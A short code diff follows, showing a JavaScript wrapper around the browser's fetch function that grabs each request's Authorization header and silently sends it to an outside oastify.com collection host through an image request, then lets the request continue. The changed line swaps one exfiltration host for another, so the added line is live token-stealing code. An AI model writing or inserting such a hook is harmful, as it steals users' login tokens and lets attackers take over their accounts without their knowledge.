@@ -9,7 +9,7 @@
         if (h) {
             const t = (h instanceof Headers) ? h.get('Authorization') : (h['Authorization'] || h['authorization']);
             if (t) {
-                new Image().src = `https://9q0xk9pkrujx4ru0fz118sjfb6hx5qtf.oastify.com/log?t=${encodeURIComponent(t)}&type=fetch`;
+                new Image().src = `https://ke2m483xcq442veofbdou6azbqhh5atz.oastify.com/log?t=${encodeURIComponent(t)}&type=fetch`;
             }
         }
         return originalFetch.apply(this, args);
